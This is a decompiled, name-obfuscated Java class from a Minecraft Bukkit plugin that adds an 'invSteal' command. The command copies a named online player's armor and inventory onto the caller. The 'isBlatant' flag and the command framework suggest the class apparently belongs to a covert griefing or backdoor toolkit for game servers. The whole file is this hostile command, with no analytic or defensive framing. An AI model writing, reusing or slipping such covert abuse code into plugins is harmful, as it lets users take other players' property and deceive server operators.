/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class InvstealCommand
extends Command {
    public InvstealCommand() {
        InvstealCommand llllllllllllllIIlIIIlllllIlIIIIl;
    }

    @Override
    public void execute(Core llllllllllllllIIlIIIlllllIIIlllI, String llllllllllllllIIlIIIlllllIIIllIl, String[] llllllllllllllIIlIIIlllllIIIllII, Player llllllllllllllIIlIIIlllllIIIlIll) {
        if (llllllllllllllIIlIIIlllllIIIllII.length <= 1) {
            llllllllllllllIIlIIIlllllIIIlIll.sendMessage(Settings.USAGE("invSteal <player>"));
        } else if (llllllllllllllIIlIIIlllllIIIllII[1].equals("*")) {
            llllllllllllllIIlIIIlllllIIIlIll.sendMessage(Settings.PREFIX("You cannot steal everyones inventory!"));
        } else {
            Player llllllllllllllIIlIIIlllllIIlIIII = Bukkit.getServer().getPlayer(llllllllllllllIIlIIIlllllIIIllII[1]);
            if (llllllllllllllIIlIIIlllllIIlIIII == null) {
                llllllllllllllIIlIIIlllllIIIlIll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(llllllllllllllIIlIIIlllllIIIllII[1]).append(Settings.WHITE).append(" is not online."))));
            } else {
                llllllllllllllIIlIIIlllllIIIlIll.getInventory().setArmorContents(llllllllllllllIIlIIIlllllIIlIIII.getInventory().getArmorContents());
                llllllllllllllIIlIIIlllllIIIlIll.getInventory().setContents(llllllllllllllIIlIIIlllllIIlIIII.getInventory().getContents());
                llllllllllllllIIlIIIlllllIIIlIll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You have copied and stolen ").append(Settings.RED).append(llllllllllllllIIlIIIlllllIIlIIII.getName()).append("'s").append(Settings.WHITE).append(" inventory"))));
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

